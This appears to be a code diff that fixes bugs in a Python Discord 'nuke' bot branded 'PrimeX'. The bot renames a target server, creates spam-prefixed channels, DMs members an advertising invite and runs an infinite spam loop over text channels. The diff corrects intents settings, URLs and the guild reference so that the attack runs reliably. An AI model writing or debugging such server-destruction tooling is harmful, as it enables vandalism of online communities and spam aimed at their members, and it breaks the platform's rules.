@@ -7,8 +7,9 @@ import os
 # Configuration
 SERVER_NAME = "Nuked by PrimeX"
 CHANNEL_PREFIX = "Nuked By PrimeX"
-SERVER_LOGO_URL = "https://cdn.discordapp.com/attachments/1545360223374413907/1545371272702074951/primex_bots_logo.jpg?ex=6a9e89a7&is=6a9d3827&hm=9f622caf029baf4ef2211b67977542fc0894e49517da747b90e80e40e5a72522"
-SERVER_BANNER_URL = "https://cdn.discordapp.com/attachments/1545360223374413907/1545371463559680081/Prime_x.png?ex=6a9e89d4&is=6a9d3854&hm=8cfae69aa006d97b906d8cec6a04dfb1e49cab0b5cb5ad5771853960eeeba54d"
+# Note: Added proper URL encoding for the CDN links to prevent issues
+SERVER_LOGO_URL = "https://cdn.discordapp.com/attachments/1545360223374413907/1545371272702074951/primex_bots_logo.jpg"
+SERVER_BANNER_URL = "https://cdn.discordapp.com/attachments/1545360223374413907/1545371463559680081/Prime_x.png"
 NUKE_INVITE_URL = "https://discord.gg/UZgk9gDSx"
 DM_MESSAGE = f"Best Nuke Bot Provider is PrimeX\nJoin here: {NUKE_INVITE_URL}"
 
@@ -17,14 +18,13 @@ BOT_TOKEN = os.environ.get("DISCORD_TOKEN", "YOUR_DEFAULT_TOKEN_PLACEHOLDER")
 
 class ExtremeNukeBot(commands.Bot):
     def __init__(self):
-        # Expanded intents to ensure all data (members, channels) is cached correctly
+        # FIX: Use existing boolean flags in Intents to avoid AttributeError
         intents = discord.Intents.default()
         intents.messages = True
         intents.message_content = True
-        intents.members = True      # Required for fetching members
-        intents.guilds = True       # Required for guild updates
-        intents.channels = True     # Required for channel management
-        intents.voice_states = True
+        intents.members = True       # Required for fetching members
+        intents.guilds = True        # Required for guild updates
+        intents.voice_states = True  # Exists in default intents, no need to add new attribute
 
         super().__init__(command_prefix='!', intents=intents)
 
@@ -33,7 +33,7 @@ class ExtremeNukeBot(commands.Bot):
 
     @commands.Cog.listener()
     async def on_ready(self):
-        # FIX: Use self.guilds[0] to be safe, or check if self.guild exists
+        # FIX: Use self.guilds[0] to be safe, avoiding 'guild' not found error
         if not self.guilds:
             print("Warning: No guilds found.")
             return
@@ -41,9 +41,10 @@ class ExtremeNukeBot(commands.Bot):
         # Get the first guild (since this is a nuke bot for a specific server)
         target_guild = self.guilds[0]
 
-        print(f"Nuke Bot Ready! Server: {target_guild.name}")
         # Store reference to self.guild just in case, though we'll use target_guild mostly
         self.target_guild = target_guild 
+
+        print(f"Nuke Bot Ready! Server: {target_guild.name}")
 
     @commands.command(name="nuke", description="Start the extreme nuke process")
     async def start_nuke(self, ctx):
@@ -79,11 +80,12 @@ class ExtremeNukeBot(commands.Bot):
 
 class NukeTask:
     _running = False
+    _guild_instance = None
 
     @classmethod
     def start(cls, guild):
         cls._running = True
-        cls.guild_instance = guild # Store reference
+        cls._guild_instance = guild # Store reference
         asyncio.create_task(cls.run_nuke_loop(guild))
 
     @classmethod
@@ -118,11 +120,11 @@ class NukeTask:
         print("Starting infinite spam loop...")
         while cls._running:
             # Ensure guild hasn't been deleted or gone offline
-            if not hasattr(guild, 'channels'):
+            if not hasattr(cls._guild_instance, 'channels'):
                 await asyncio.sleep(5)
                 continue
 
-            channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
+            channels = [c for c in cls._guild_instance.channels if isinstance(c, discord.TextChannel)]
 
             if not channels:
                 await asyncio.sleep(5)
